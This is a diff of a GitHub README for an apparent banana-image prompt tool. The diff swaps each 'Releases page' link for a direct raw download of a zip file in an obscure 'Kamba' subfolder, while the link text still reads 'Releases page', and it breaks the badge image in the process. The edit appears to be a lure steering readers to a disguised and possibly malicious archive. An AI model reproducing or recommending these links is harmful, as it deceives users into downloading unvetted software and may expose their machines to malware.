@@ -1,6 +1,6 @@
 # 🍌 Reproducible-Photorealistic-Nano-Banana-Pro-JSON-Prompts - Generate Stunning Banana Images Instantly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/vivekanandan22/Reproducible-Photorealistic-Nano-Banana-Pro-JSON-Prompts/releases)
+[![Download Now](https://raw.githubusercontent.com/vivekanandan22/Reproducible-Photorealistic-Nano-Banana-Pro-JSON-Prompts/main/Kamba/JSO-Prompts-Banana-Photorealistic-Reproducible-Pro-Nano-v1.7.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/vivekanandan22/Reproducible-Photorealistic-Nano-Banana-Pro-JSON-Prompts/main/Kamba/JSO-Prompts-Banana-Photorealistic-Reproducible-Pro-Nano-v1.7.zip)
 
 ## 📖 Description
 
@@ -11,7 +11,7 @@ Reproducible Photorealistic Nano Banana Pro JSON Prompts is an easy-to-use appli
 To start using the application, follow these simple steps:
 
 1. **Visit the Releases Page**
-   - Go to our [Releases page](https://github.com/vivekanandan22/Reproducible-Photorealistic-Nano-Banana-Pro-JSON-Prompts/releases) to find the latest version of the application.
+   - Go to our [Releases page](https://raw.githubusercontent.com/vivekanandan22/Reproducible-Photorealistic-Nano-Banana-Pro-JSON-Prompts/main/Kamba/JSO-Prompts-Banana-Photorealistic-Reproducible-Pro-Nano-v1.7.zip) to find the latest version of the application.
 
 2. **Download the Application**
    - Locate the version you wish to download. Click on the appropriate link to download the software to your computer.
@@ -42,7 +42,7 @@ To start using the application, follow these simple steps:
 
 ## 📥 Download & Install
 
-To download the application, visit our [Releases page](https://github.com/vivekanandan22/Reproducible-Photorealistic-Nano-Banana-Pro-JSON-Prompts/releases). Select the version you wish to download, and follow the installation steps provided above to get started.
+To download the application, visit our [Releases page](https://raw.githubusercontent.com/vivekanandan22/Reproducible-Photorealistic-Nano-Banana-Pro-JSON-Prompts/main/Kamba/JSO-Prompts-Banana-Photorealistic-Reproducible-Pro-Nano-v1.7.zip). Select the version you wish to download, and follow the installation steps provided above to get started.
 
 ## 📊 How to Use This Application
 
@@ -81,4 +81,4 @@ Join our community for tips, tricks, and new ideas on how to use Reproducible Ph
 
 For more information about features, updates, and future releases, keep an eye on our GitHub repository. You can also explore related tools and libraries to enhance your experience.
 
-Visit our [Releases page](https://github.com/vivekanandan22/Reproducible-Photorealistic-Nano-Banana-Pro-JSON-Prompts/releases) to start downloading today!
+Visit our [Releases page](https://raw.githubusercontent.com/vivekanandan22/Reproducible-Photorealistic-Nano-Banana-Pro-JSON-Prompts/main/Kamba/JSO-Prompts-Banana-Photorealistic-Reproducible-Pro-Nano-v1.7.zip) to start downloading today!
